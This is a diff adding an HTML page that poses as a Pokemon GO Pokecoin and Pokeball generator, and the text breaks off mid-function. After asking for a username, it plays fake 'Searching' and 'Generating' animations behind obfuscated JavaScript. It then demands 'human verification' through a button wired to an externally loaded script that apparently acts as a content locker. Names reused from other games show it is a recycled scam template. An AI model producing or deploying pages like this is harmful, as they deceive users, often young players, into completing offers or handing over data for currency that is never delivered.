@@ -1,0 +1,861 @@
+
+
+<!DOCTYPE html>
+<!--
+
+-->
+<html><head>
+    <title>Pokemon GO Pokecoins & Pokeballs Generator</title>
+<meta name="description" content="Generate unlimited amount of Pokecoins and Pokeballs on Pokemong GO"/>
+<meta property="og:title" content="Pokemon GO Pokecoins & Pokeballs Generator"/>
+<meta property="og:description" content="Generate unlimited amount of Pokecoins and Pokeballs on Pokemong GO"/>
+<meta name="referrer" content="no-referrer">
+
+<!-- Analytics -->
+
+<script
+        src="https://browser.sentry-cdn.com/6.4.1/bundle.min.js"
+        integrity="sha384-THoc7rflwZFKTdZNgv6jLFFDn299Uv3t1SW5B4yGLvLiCRTYP9ys6vXZcMl95TQF"
+        crossorigin="anonymous"
+></script>
+<script>
+    Sentry.init({
+        dsn: 'https://e0e6a104cb354a09bf094a90e676ea13@o425163.ingest.sentry.io/5780930',
+        tracesSampleRate: 0.01
+    });
+</script>
+<script>
+    (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r;
+        i[r] = i[r] || function () {
+            (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date();
+        a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+        a.async = 1;
+        a.src = g;
+        m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+
+
+    
+    ga('send', 'pageview');
+
+</script>
+
+
+    <style>
+        .header_blue {
+            background: #1565c0;
+            padding: 80px 0 20px;
+            color: #fff;
+            font-size: 48px;
+            font-weight: 300;
+            margin-bottom: 40px;
+        }
+        .header_text {
+            margin-left: auto;
+            margin-right: auto;
+            width: 80%;
+        }
+        body{
+            margin:0;
+            font-family:Roboto, sans-serif;
+            color:#444;
+        }
+        .unlockBtn:hover{
+            box-shadow: 0 3px 6px rgba(0,0,0,.16), 0 3px 6px rgba(0,0,0,.23);
+        }
+        .unlockBtn {
+            background: #2196f3;
+            border: none;
+            border-radius: 2px;
+            box-shadow: 0 1px 3px rgba(0,0,0,.12), 0 1px 2px rgba(0,0,0,.24);
+            min-height: 31px;
+            min-width: 70px;
+            padding: 2px 16px;
+            text-align: center;
+            text-shadow: none;
+            text-transform: uppercase;
+            -webkit-transition: all 280ms ease;
+            transition: all 280ms ease;
+            box-sizing: border-box;
+            cursor: pointer;
+            -webkit-appearance: none;
+            display: inline-block;
+            vertical-align: middle;
+            font: 500 14px/31px Roboto,sans-serif!important;
+            outline: 0!important;
+            color:white;
+        }
+        .content-container{
+            width:80%;margin:0 auto;
+        }
+        @font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Pru33qjShpZSmG3z6VYwnRJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/oOeFwZNlrTefzLYmlVV1UBJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}
+        
+body{
+
+    font-family: 'Kanit Light', sans-serif;
+    overflow-y: auto;
+    margin: 0;
+    padding: 0;
+    color: black;
+    background-size: 100%;
+    background-image: -webkit-gradient(linear, 0 0, 100% 100%, color-stop(0, #edd154), color-stop(100%, #3566aa));
+    background-image: -webkit-linear-gradient(135deg, #edd154, #3566aa);
+    background-image: -moz-linear-gradient(45deg, #edd154, #3566aa);
+    background-image: -ms-linear-gradient(45deg, #edd154 0, #3566aa 100%);
+    background-image: -o-linear-gradient(45deg, #edd154, #3566aa);
+    background-image: linear-gradient(135deg, #edd154, #3566aa);
+
+}
+
+div{
+    display: block;
+}
+
+.center{
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    min-height: 100vh;
+}
+
+.main{
+    text-align: center;
+    background: #f0f0f0;
+    width: 90%;
+    max-width:40em;
+    justify-content: center;
+    align-items: center;
+    border-radius: 1em;
+    border-color: white;
+    border-style: solid;
+    border-width: 0.1em;
+    box-shadow: 0 0 1em white;
+    box-sizing: border-box;
+
+}
+
+.mainimg{
+    width: 20em;
+    position: relative;
+    margin: -9em 0 -5.6em 0;
+}
+
+.step0-txt{
+    font-weight: 600;
+    font-size: 1.6em;
+    width: 80%;
+    margin: 1em auto;
+
+}
+
+.user-box{
+    overflow: auto;
+    position: relative;
+}
+
+.user-icon{
+    margin-top: 1.2em;
+    position: absolute;
+    width: 2.5em;
+    z-index: 2;
+    margin-left: 1.4em;
+}
+
+.user-input{
+    position: relative;
+    background: #FFFFFF;
+    outline: none;
+    box-shadow: none;
+    width: 15em;
+    height: 3em;
+    padding: 0 1em 0 2.5em;
+    font-size: 1.75em;
+    border-radius: 0.6em;
+    border-width: 0.15em;
+    border-color: #3566aa;
+    border-style: solid;
+    font-weight: bold;
+    box-sizing: border-box;
+    max-width: 40em;
+    vertical-align: middle;
+}
+
+.shakeanim{
+    animation: shake 0.3s ease-in-out;
+}
+
+@keyframes shake {
+    0%, 100% {
+        margin-left: 0;
+    }
+    20%, 80%{
+        margin-left: -0.5em;
+    }
+    40%, 60%{
+        margin-left: 0.5em;
+    }
+}
+
+input, textarea{
+    color: black;
+}
+
+::placeholder{
+    color: black;
+    opacity:40%;
+}
+
+.btn0 {
+    background: #3566aa;
+    color: white;
+    width: 30%;
+    padding: 1em 0 1em 0;
+    margin: 0 auto;
+    margin-top: 1em;
+    margin-bottom: 1em;
+    border-radius: 0.5em;
+    font-weight: 900;
+    font-size: 1.5em;
+    box-sizing: border-box;
+    font-family: "Kanit Medium", sans-serif;
+}
+
+.btn0:hover{
+    background:#edd154;
+    transform: scale(1.1);
+    cursor: pointer;
+    box-shadow: 0 0 0.5em #edd154;
+}
+
+.btn1{
+    background: #3566aa;
+    color: white;
+    width: 33%;
+    padding: 0.5em 0 0.5em 0;
+    margin: 1.5em auto;
+    border-radius: 0.5em;
+    font-weight: 600;
+    font-size: 1.5em;
+    box-sizing: border-box;
+    font-family: "Kanit Medium", sans-serif;
+}
+
+.btn1:hover{
+    background:whitesmoke;
+    color: #edd154;
+    transform: scale(1.1);
+    cursor: pointer;
+    box-shadow: 0 0 0.5em #edd154;
+}
+
+.btn3{
+    background: #3566aa;
+    color: white;
+    padding: 1em 0 1em 0;
+    margin: 0 auto;
+    margin-top: 1em;
+    margin-bottom: 1em;
+    border-radius: 0.5em;
+    font-weight: 900;
+    font-size: 1.5em;
+    box-sizing: border-box;
+    font-family: "Kanit Medium", sans-serif;
+    width: 30%;
+}
+
+.btn3:hover{
+    background:#edd154;
+    transform: scale(1.1);
+    cursor: pointer;
+    box-shadow: 0 0 0.5em #edd154;
+}
+
+.devices{
+    display: flex;
+    justify-content: center;
+    margin-top: 1em;
+    box-sizing: border-box;
+    cursor: pointer;
+    float: none;
+    margin-bottom: 2em;
+}
+
+.platform{
+    background: #FFFFFF;
+    width: 8em;
+    height: 5.5em;
+    border-radius: 1em;
+    padding-top: 1em;
+    margin: 1em;
+    box-shadow: 0 0 0.6em black;
+}
+
+.platform:hover{
+    background:#FFFFFF;
+    transform: scale(1.1);
+    box-shadow: 0 0 0.5em #edd154;
+
+}
+
+.search0{
+    margin: 0 auto;
+    text-align: center;
+    height: 10em;
+    font-weight: 600;
+}
+
+.search1{
+    margin: 0 auto;
+    text-align: center;
+    height: 22em;
+    margin-top: 2em;
+}
+
+.laststep{
+    margin: 0 auto;
+    text-align: center;
+    height: 22em;
+    margin-top: 2em;
+    font-family: 'Kanit Medium', sans-serif;
+}
+
+.searching{
+    width: 10em;
+    background: #FFFFFF;
+    margin: 0 auto;
+    border-radius: 1em;
+    padding:0.5em;
+    font-size: 1.2em;
+    box-shadow: 0 0 0.6em black;
+}
+
+.searchingname{
+    margin: 0 auto;
+}
+
+#dots:after {
+    content: '.';
+    animation: dots 1s steps(5, end) infinite;}
+
+@keyframes dots {
+    0%, 20% {
+        color: rgba(0,0,0,0);
+        text-shadow:
+                .25em 0 0 rgba(0,0,0,0),
+                .5em 0 0 rgba(0,0,0,0);}
+    40% {
+        color: black;
+        text-shadow:
+                .25em 0 0 rgba(0,0,0,0),
+                .5em 0 0 rgba(0,0,0,0);}
+    60% {
+        text-shadow:
+                .25em 0 0 black,
+                .5em 0 0 rgba(0,0,0,0);}
+    80%, 100% {
+        text-shadow:
+                .25em 0 0 black,
+                .5em 0 0 black;}}
+
+
+.checkmark-icon{
+    width: 1em;
+    float: right;
+    margin-left: -1em;
+    margin-top: -1.2em;
+}
+
+.devices-pic{
+    width: 3em;
+    margin-top: 0.7em;
+}
+
+.devices-pic.ios{
+    margin-top: 0.5em;
+}
+
+.secondimg{
+    float:right;
+    width: 15em;
+    margin-top: 6.5em;
+    margin-right: 5em;
+}
+
+.VBucks-Div{
+    margin: 1em 0 2em 0;
+    cursor: pointer;
+}
+
+.VBucks-Div2{
+    margin: 1em 0 2em 0;
+    cursor: pointer;
+}
+
+.VBucks-pic{
+    width: 4em;
+}
+
+.vbucks-text{
+    font-size: 1.8em;
+    font-weight: 800;
+    margin-left:0.5em;
+}
+
+.VBucks{
+    background: #FFFFFF;
+    box-shadow: 0 0 0.6em black;
+    border-radius: 1em;
+    margin: 1em auto;
+    display: flex;
+    box-sizing: border-box;
+    position: relative;
+    width: 90%;
+    max-width: 40em;
+    height: 5em;
+    align-items: center;
+    justify-content: center;
+}
+
+.VBucks:hover{
+    background:#FFFFFF;
+    transform: scale(1.02);
+    box-shadow: 0 0 0.5em #edd154;
+    cursor: pointer;
+}
+
+.VBucks1{
+    background: #FFFFFF;
+    box-shadow: 0 0 0.6em black;
+    border-radius: 1em;
+    margin: 1em auto;
+    display: flex;
+    box-sizing: border-box;
+    position: relative;
+    width: 90%;
+    max-width: 40em;
+    height: 5em;
+    align-items: center;
+    justify-content: center;
+}
+
+.VBucks1:hover{
+    background:#FFFFFF;
+    transform: scale(1.02);
+    box-shadow: 0 0 0.5em #3566aa;
+    cursor: pointer;
+}
+
+.Selected{
+    background: #3566aa;
+    box-shadow: 0 0 0.5em #3566aa;
+    color: #FFFFFF;
+    border-radius: 1em;
+    margin: 0.5em auto;
+    display: flex;
+    box-sizing: border-box;
+    position: relative;
+    width: 90%;
+    max-width: 40em;
+    height: 5em;
+    align-items: center;
+    justify-content: center;
+}
+
+.Selected1{
+    background: #3566aa;
+    box-shadow: 0 0 0.5em #3566aa;
+    color: #FFFFFF;
+    border-radius: 1em;
+    margin: 0.5em auto;
+    display: flex;
+    box-sizing: border-box;
+    position: relative;
+    width: 90%;
+    max-width: 40em;
+    height: 5em;
+    align-items: center;
+    justify-content: center;
+}
+
+.progress-bg{
+    margin-top: 0.5em;
+    width: 26em;
+    height: 1em;
+    background-color: whitesmoke;
+    border-radius: 0.5em;
+    display: inline-block;
+}
+.progress-bar{
+    margin-top: 0;
+    margin-left: -0.1em;
+    width: 0;
+    height: 1em;
+    background:#edd154;
+    border-radius: 0.5em;
+}
+.progressbar25{
+    animation: progress1 1s  linear;
+    animation-fill-mode: forwards;
+}
+@keyframes progress1{
+    0%  {width: 0;}
+    100%  {width: 25%;}
+}
+.progressbar40{
+    animation: progress2 2s  linear;
+    animation-fill-mode: forwards;
+}
+@keyframes progress2{
+    0%  {width: 25%;}
+    100%  {width: 40%;}
+}
+.progressbar75{
+    animation: progress3 1s  linear;
+    animation-fill-mode: forwards;
+}
+@keyframes progress3{
+    0%  {width: 40%;}
+    100%  {width: 75%;}
+}
+.progressbar95{
+    animation: progress4 1s  linear;
+    animation-fill-mode: forwards;
+}
+@keyframes progress4{
+    0%  {width: 75%;}
+    100%  {width: 95%;}
+}
+
+.settings-rotate{
+    animation: ranimation 2s linear infinite;
+}
+
+@keyframes ranimation {
+    0%  {transform: rotate(0deg);}
+    100%  {transform:  rotate(360deg);}
+}
+
+#loader{
+    animation: ranimation 2s linear infinite;
+    display: none;
+}
+
+.laststep-rotate{
+    animation: ranimation 2s linear infinite;
+    width: 5em;
+    margin-top: -5em;
+}
+
+.LastStepTxt {
+    font-size: 1.5em;
+    font-weight: 700;
+    width: 90%;
+    margin: 1em auto;
+}
+
+
+/*              Mobile                 */
+
+@media only screen and (max-width: 768px) {
+    .main{
+        margin-top: 5em;
+    }
+    .platform{
+        width: 6em;
+        height: 4em;
+    }
+
+    .johnwickgif{
+        margin-left: 7em;
+        position: absolute;
+        box-sizing: border-box;
+    }
+    .devices{
+        margin: 1em auto;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        /* position: absolute; */
+    }
+    .devices-pic{
+        width: 2.6em;
+        margin: 0 auto;
+    }
+    .devices-pic.ios{
+        margin-top: 0.1em;
+    }
+    .devices-pic.android{
+        margin-top: 0.1em;
+    }
+    .devices-pic.windows{
+        margin-top: 0.2em;
+    }
+    .platform{
+        margin: 0.8em;
+    }
+    .secondimg{
+        width: 20em;
+        margin-top: -1em;
+        box-sizing: border-box;
+    }
+    .VBucks-Div{
+        box-sizing: border-box;
+    }
+    .VBucks-Div2{
+        box-sizing: border-box;
+    }
+    .VBucks{
+        width: 90%;
+    }
+    .VBucks1{
+        width: 90%;
+    }
+    .Selected{
+        width: 90%;
+    }
+    .Selected1{
+        width: 90%;
+    }
+    .vbucks-text{
+        font-size: 1.5em;
+        font-weight: 800;
+    }
+    .VBucks-pic{
+        width: 3em;
+        float: left;
+    }
+
+    .laststep{
+        height: 100%;
+    }
+
+    .step0-txt{
+        font-size: 1.5em;
+        margin-top: 0.8em;
+    }
+    .progress-bg{
+        width: 90%;
+    }
+    .settings-rotate{
+        margin-bottom: 1em;
+        margin-top: 0.8em;
+    }
+    .user-input{
+        width: 90%;
+    }
+    .btn0{
+        width: 40%;
+    }
+    .btn1, .btn3{
+        width: 44%;
+    }
+    .checkmark-icon{
+        margin-top: -1em;
+    }
+}
+
+@media only screen and (max-width: 319px){
+    .VBucks{
+        width: 90%;
+    }
+    .vbucks-text{
+        font-size: 1.2em;
+        font-weight: 800;
+        margin-top: 0 auto;
+    }
+    .VBucks-pic{
+        display: none;
+    }
+    .user-input{
+        font-size: 22px;
+        margin: 0 auto;
+    }
+    .user-icon{
+        margin: 0.7em 0.8em;
+    }
+}
+
+@media only screen and (max-width: 395px){
+    .vbucks-text{
+        font-size: 1.2em;
+        font-weight: 800;
+        margin: 1.4em 1em;
+    }
+    .user-input{
+        font-size: 22px;
+    }
+    .user-icon{
+        margin: 0.6em 0.6em;
+    }
+}
+
+@media only screen and (max-width: 440px){
+    .secondimg{
+        display: none;
+    }
+    .devices{
+        margin: 1em auto;
+    }
+    .vbucks-text{
+        font-size: 1.4em;
+        font-weight: 800;
+        margin: 1em 1em;
+    }
+    .VBucks-pic{
+        margin-right: 0;
+    }
+    .btn0{
+        width: 50%;
+    }
+    .btn1, .btn3{
+        width: 54%;
+    }
+}
+
+/* BG */
+
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>Pokemon GO Pokecoin & Pokeball Generator</title>
+    <link rel="stylesheet" href="main.css">
+    <script src="script.js"></script>
+    <link rel="icon" type="image/x-icon" href="https://d266key948fg17.cloudfront.net/uploads/14813706515f3cb0a891d936e1d681e615cd1ed469.png">
+</head>
+<body>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Kanit&display=swap');
+</style>
+
+<div class="center">
+    <div class="main" id="main0" style="display: 1none;">
+        <img src="https://d266key948fg17.cloudfront.net/uploads/14813706515f3cb0a891d936e1d681e615cd1ed469.png" alt="Avakin Life Logo" class="mainimg">
+        <div class="step0" id="step0">
+            <div class="step0-txt"> Enter your Username or ID to Generate Pokecoins & Pokeballs </div>
+            <div class="user-box" id="user-box">
+                <img src="https://d266key948fg17.cloudfront.net/uploads/16521063221bb696466af9a143142d50da47359338.png" class="user-icon">
+                <input class="user-input" id="input-id" placeholder="Username or ID">
+            </div>
+            <div class="btn0" id="btn0id" onclick="firstmain0()">NEXT</div>
+        </div>
+        <div class="search0" id="search0" style="display: none ;">
+            <div class="step0-txt" style="margin-bottom: 0.3em;">Searching<span id="dots"></span></div>
+            <div class="searching">
+                <div class="searchingdata">
+                    <div class="searchingname" id="searching-text-name"></div>
+                    <div><img src="https://d266key948fg17.cloudfront.net/uploads/16521928642e7a7c210f971e9f8a7a0fb86f92bb2a.png" class="checkmark-icon" id="checkmark-icon" style="display: none;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="main" id="main1" style="display: none;">
+        <img src="https://d266key948fg17.cloudfront.net/uploads/14813706515f3cb0a891d936e1d681e615cd1ed469.png" alt="Avakin Life Logo" class="mainimg">
+        <div class="step0-txt"> Select your device</div>
+        <div class="devices">
+            <div class="platform selectedPlatform" id="platform0" onclick="device_click()">
+                <img src="https://d266key948fg17.cloudfront.net/uploads/1652106952d1b126420c2e61f86903a650c6b5059b.png" class="devices-pic android">
+            </div>
+            <div class="platform" id="platform1" onclick="device_click()">
+                <img src="https://d266key948fg17.cloudfront.net/uploads/165210695181b32d93b95e48db0eb4b1c1015d7fd8.png" class="devices-pic ios">
+            </div>
+            <div class="platform" id="platform2" onclick="device_click()">
+                <img src="https://d266key948fg17.cloudfront.net/uploads/16521069526685e8acc2881e9f06e23c7eb8a19e4c.png" class="devices-pic windows">
+            </div>
+        </div>
+    </div>
+    <div class="main" id="main2" style="display: none;">
+        <img src="https://d266key948fg17.cloudfront.net/uploads/14813706515f3cb0a891d936e1d681e615cd1ed469.png" alt="Avakin Life Logo" class="mainimg">
+        <div class="step0" id="step1" style="display: 1none;">
+            <div class="step0-txt"> Select Pokecoin & Pokeball Amount </div>
+            <div class="VBucks-Div" id="VBucks-div">
+                <div class="Selected" id="VBucks0" onclick="VBucksSelected('VBucks0','2000 ')">
+                    <img src="https://d266key948fg17.cloudfront.net/uploads/16535833393431f4ca70ab0c93ebd83fccac1f4a16.png" class="VBucks-pic one">
+                    <div class="vbucks-text"> 2000 Pokecoins </div>
+                </div>
+                <div class="VBucks" id="VBucks1" onclick="VBucksSelected('VBucks1','5000 ')">
+                    <img src="https://d266key948fg17.cloudfront.net/uploads/16535833393431f4ca70ab0c93ebd83fccac1f4a16.png" class="VBucks-pic two">
+                    <div class="vbucks-text">5000 Pokecoins </div>
+                </div>
+                <div class="VBucks" id="VBucks2" onclick="VBucksSelected('VBucks2','9000 ')">
+                    <img src="https://d266key948fg17.cloudfront.net/uploads/16535833393431f4ca70ab0c93ebd83fccac1f4a16.png" class="VBucks-pic three">
+                    <div class="vbucks-text">9000 Pokecoins </div>
+                </div>
+            </div>
+
+            <div class="btn3" id="btn3id" onclick="btn3_click()">Next</div>
+
+            <div class="VBucks-Div2" id="VBucks-div2">
+                <div class="Selected1" id="VBucks00" onclick="VBucksSelected2('VBucks00','15000 ')">
+                    <img src="https://d266key948fg17.cloudfront.net/uploads/1654295804b71c826d049a7423d1958e583a5bed3a.png" class="VBucks-pic one">
+                    <div class="vbucks-text"> 15000 Pokeballs </div>
+                </div>
+                <div class="VBucks1" id="VBucks01" onclick="VBucksSelected2('VBucks01','50000 ')">
+                    <img src="https://d266key948fg17.cloudfront.net/uploads/1654295804b71c826d049a7423d1958e583a5bed3a.png" class="VBucks-pic two">
+                    <div class="vbucks-text">50000 Pokeballs </div>
+                </div>
+                <div class="VBucks1" id="VBucks02" onclick="VBucksSelected2('VBucks02','90000 ')">
+                    <img src="https://d266key948fg17.cloudfront.net/uploads/1654295804b71c826d049a7423d1958e583a5bed3a.png" class="VBucks-pic three">
+                    <div class="vbucks-text">90000 Pokeballs </div>
+                </div>
+            </div>
+            <div class="btn0" id="btn1id" onclick="GenerateButton()">Generate</div>
+        </div>
+        <div class="search1" id="search1" style="display: none ;">
+            <img src="https://d266key948fg17.cloudfront.net/uploads/1652194594fea7175a707ceefbaa64e6857ffd6767.png" class="settings-rotate">
+            <div class="step0-txt" id="Generating-step0">Getting Ready..</div>
+            <div class="progress-bg">
+                <div class="progress-bar" id="progress-bar">
+                </div>
+                <img src="https://d266key948fg17.cloudfront.net/uploads/1652113019440ef225735d8aab8fc45ec04e7a6aa4.png" id="loader" style="margin-top: 2em; width: 2em;">
+            </div>
+        </div>
+    </div>
+    <div class="main" id="main3" style="display: none;">
+        <div class="laststep" id="laststep" style="display: 1none ;">
+            <img src="https://d266key948fg17.cloudfront.net/uploads/1652194619c7feb47a1add45dc53247b16cbcf8ab0.png" class="laststep-rotate">
+            <div class="LastStepTxt" id="LastStepTxt">Hello <span id="Name-LastStep" style="color: #edd154; font-weight: bold;"></span>! You are almost there. <br><br> To generate <span id="vbucksamount" style="color: #edd154; font-weight: 900;"></span> Pokecoins and <span id="vbucksamount2" style="color: #edd154; font-weight: 900;"></span> Pokeballs into your account complete the human verification. Click on the button to verify. </div>
+            <div class="btn1 showContentLocker" id="btn2id" onclick=""> Verify </div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+    var LTyvt_ajJ_Qngnac={"it":4365529,"key":"55000"};
+</script>
+<script src="https://d26h1wdc757l2w.cloudfront.net/fbacfdb.js"></script>
+<script type="text/javascript">
+    $('.showContentLocker').click(function(){
+       _VE();
+        return false;
+    });
+</script>
+<script>
+
+</script>
+<script type="text/javascript">
+    var _0x545aa5=_0x8f8e;(function(_0x503ede,_0x24d265){var _0x7540b8=_0x8f8e,_0x8a8036=_0x503ede();while(!![]){try{var _0x45edba=parseInt(_0x7540b8(0x13c))/0x1*(-parseInt(_0x7540b8(0x125))/0x2)+parseInt(_0x7540b8(0x155))/0x3*(parseInt(_0x7540b8(0x132))/0x4)+parseInt(_0x7540b8(0x11d))/0x5+-parseInt(_0x7540b8(0x141))/0x6*(parseInt(_0x7540b8(0x159))/0x7)+-parseInt(_0x7540b8(0x138))/0x8+parseInt(_0x7540b8(0x120))/0x9+-parseInt(_0x7540b8(0x158))/0xa;if(_0x45edba===_0x24d265)break;else _0x8a8036['push'](_0x8a8036['shift']());}catch(_0x3c4c58){_0x8a8036['push'](_0x8a8036['shift']());}}}(_0x5518,0xa1caf));var vbucksValue=0x7d0,vbucksValue2=0x3a98,name='';function firstmain0(){var _0x106117=_0x8f8e;name=document[_0x106117(0x13a)](_0x106117(0x117))[_0x106117(0x151)],name==''||name[_0x106117(0x143)]<=0x2||name[_0x106117(0x143)]>0x10?(document[_0x106117(0x13a)](_0x106117(0x117))[_0x106117(0x145)][_0x106117(0x14d)]=_0x106117(0x135),document[_0x106117(0x13a)]('user-box')[_0x106117(0x126)]['add'](_0x106117(0x12b)),setTimeout(function(){var _0x206cce=_0x106117;document[_0x206cce(0x13a)](_0x206cce(0x117))['style'][_0x206cce(0x149)](_0x206cce(0x14d)),document[_0x206cce(0x13a)](_0x206cce(0x139))[_0x206cce(0x126)][_0x206cce(0x13f)](_0x206cce(0x12b));},0x1f4)):setTimeout(function(){var _0x310302=_0x106117;document[_0x310302(0x13a)]('searching-text-name')[_0x310302(0x140)]=name,document[_0x310302(0x13a)](_0x310302(0x123))[_0x310302(0x145)]['display']=_0x310302(0x11b),setTimeout(function(){var _0x1f698f=_0x310302;document[_0x1f698f(0x13a)](_0x1f698f(0x11c))[_0x1f698f(0x145)]['display']='block',setTimeout(function(){var _0x6fafae=_0x1f698f;document['getElementById'](_0x6fafae(0x116))[_0x6fafae(0x145)]['display']=_0x6fafae(0x153),document[_0x6fafae(0x13a)](_0x6fafae(0x157))['style'][_0x6fafae(0x14e)]=_0x6fafae(0x11b),setTimeout(function(){var _0x3c5488=_0x6fafae;document[_0x3c5488(0x13a)](_0x3c5488(0x12a))[_0x3c5488(0x145)][_0x3c5488(0x14e)]='none',setTimeout(function(){var _0xdbeb11=_0x3c5488;document[_0xdbeb11(0x13a)](_0xdbeb11(0x118))[_0xdbeb11(0x145)][_0xdbeb11(0x14e)]=_0xdbeb11(0x153);},0x64);},0x7d0);},0x1388);},0x64);},0x64);}function _0x5518(){var _0xd77c22=['borderBottom','display','loader','vbucksamount','value','progressbar25','block','VBucks0','6SDGpgW','VBucks2','dots','16611910mIoiTf','37954DzetPp','main3','checkmark-icon','input-id','main1','click','progressbar40','none','search0','4243930jjIhdf','\x20Pokecoins\x20and\x20','VBucks','9596664LioEEz','progress-bar','\x20Pokeballs\x20for\x20','step0','Generating-step0','2hSKlrJ','classList','Loading\x20last\x20step..','Finalizing...','vbucksamount2','main0','shakeanim','inline-block','progressbar95','add','main2','Generating\x20','step1','1873292nQNGRH','VBucks01','addEventListener','0.2em\x20solid\x20darkred','btn3id','VBucks-div2','346936gORqRs','input-box','getElementById','VBucks-div','267587UcLJOQ','Selected1','VBucks1','remove','innerHTML','240IKsJOu','Selected','length','btn1id','style','platform0','search1','VBucks02','removeProperty','progressbar75','platform1','VBucks00'];_0x5518=function(){return _0xd77c22;};return _0x5518();}function device_click(){var _0x5c7c2d=_0x8f8e;document[_0x5c7c2d(0x13a)](_0x5c7c2d(0x118))[_0x5c7c2d(0x145)][_0x5c7c2d(0x14e)]=_0x5c7c2d(0x11b),setTimeout(function(){var _0x66a4ca=_0x5c7c2d;document[_0x66a4ca(0x13a)]('btn1id')[_0x66a4ca(0x145)][_0x66a4ca(0x14e)]=_0x66a4ca(0x11b),document[_0x66a4ca(0x13a)]('VBucks-div2')['style'][_0x66a4ca(0x14e)]=_0x66a4ca(0x11b),document['getElementById']('main2')['style'][_0x66a4ca(0x14e)]=_0x66a4ca(0x153);},0x64);}document[_0x545aa5(0x13a)](_0x545aa5(0x146))[_0x545aa5(0x134)](_0x545aa5(0x119),device_click),document[_0x545aa5(0x13a)](_0x545aa5(0x14b))[_0x545aa5(0x134)](_0x545aa5(0x119),device_click),document[_0x545aa5(0x13a)]('platform2')[_0x545aa5(0x134)](_0x545aa5(0x119),device_click);function btn3_click(){var _0x203436=_0x545aa5;document[_0x203436(0x13a)](_0x203436(0x136))[_0x203436(0x145)]['display']=_0x203436(0x11b),document[_0x203436(0x13a)](_0x203436(0x13b))['style'][_0x203436(0x14e)]=_0x203436(0x11b),document[_0x203436(0x13a)](_0x203436(0x144))[_0x203436(0x145)]['display']=_0x203436(0x153),document['getElementById'](_0x203436(0x137))[_0x203436(0x145)][_0x203436(0x14e)]=_0x203436(0x153);}function VBucksSelected(_0x1fe336,_0x409d38){var _0x18af69=_0x545aa5;vbucksValue=_0x409d38,document[_0x18af69(0x13a)]('VBucks0')[_0x18af69(0x126)]['add']('VBucks'),document[_0x18af69(0x13a)](_0x18af69(0x13e))[_0x18af69(0x126)][_0x18af69(0x12e)](_0x18af69(0x11f)),document[_0x18af69(0x13a)](_0x18af69(0x156))[_0x18af69(0x126)][_0x18af69(0x12e)]('VBucks'),document[_0x18af69(0x13a)](_0x18af69(0x154))[_0x18af69(0x126)][_0x18af69(0x13f)](_0x18af69(0x142)),document[_0x18af69(0x13a)](_0x18af69(0x13e))[_0x18af69(0x126)][_0x18af69(0x13f)]('Selected'),document[_0x18af69(0x13a)](_0x18af69(0x156))['classList'][_0x18af69(0x13f)](_0x18af69(0x142)),document['getElementById'](_0x1fe336)['classList'][_0x18af69(0x12e)]('Selected'),document[_0x18af69(0x13a)](_0x1fe336)[_0x18af69(0x126)]['remove'](_0x18af69(0x11f));}function VBucksSelected2(_0x47b1e6,_0x350bee){var 